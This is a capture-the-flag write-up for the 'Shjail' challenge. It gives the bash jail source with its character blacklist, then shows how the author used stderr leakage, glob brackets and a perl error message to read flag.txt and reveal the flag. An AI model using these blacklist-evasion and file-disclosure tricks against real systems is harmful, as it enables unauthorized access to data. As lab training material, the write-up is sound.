# Shjail
**Category: Misc**

This challenge allows us to run a shell command on the remote system. The catch is that there is a character blacklist, and the output from commands you submit is hidden.

The source was provided:

```sh
#!/bin/bash
RED='\e[0;31m'
END='\e[0m'
GREEN='\e[0;32m'

while :
do
    echo "What would you like to say?"
	read USER_INP
       	if [[ "$USER_INP" =~ ['&''$''`''>''<''/''*''?'txcsbqi] ]]; then
               	echo -e "${RED}Hmmmm, what are you trying to do?${END}"
       	else
               	OUTPUT=$($USER_INP) &>/dev/null
               	echo -e "${GREEN}The command has been executed. Let's go again!${END}"
       	fi
done 
```


The first thing I realized was that stdout is blocked, but stderr is actually available. For example:

```
What would you like to say?
pwd
The command has been executed. Let's go again!
```
Notice how `pwd` returns no output.

```
What would you like to say?
fake
./shjail.sh: line 13: fake: command not found
```
But this nonexistant command does, since the output is written to stderr. Unfortunately, the operator to redirect stdout to stderr is blacklisted.

## Finding the flag
Next, we need to try and find where the flag file is. It is probably just `./flag.txt`, but this needs to be confirmed. We can't open it with `cat` since `t` is blocked, but we can use `od`. We can't write the `txt` part of `flag.txt`, or even use `flag.*`. We can write it out using bracket glob characters though. All together:

```
What would you like to say?
od flag.[a-z][a-z][a-z]
The command has been executed. Let's go again!
```

Since no file not found error was reported, we know the flag file is in the local directory.

## Opening the flag
From here we need a way to open the flag file in a way that prints the result to stderr. We can try and execute the file with a program that produces a verbose error message:

```
What would you like to say?
perl flag.[a-z][a-z][a-z]
Can't locate object method "flag" via package "w3ll_th1s_f1l3_sh0uldnt_h4v3_fl4g_1n_2738372131" (perhaps you forgot to load "w3ll_th1s_f1l3_sh0uldnt_h4v3_fl4g_1n_2738372131"?) at flag.txt line 1.
```

Perfect! This reveals the flag to be `flag{w3ll_th1s_f1l3_sh0uldnt_h4v3_fl4g_1n_2738372131}`.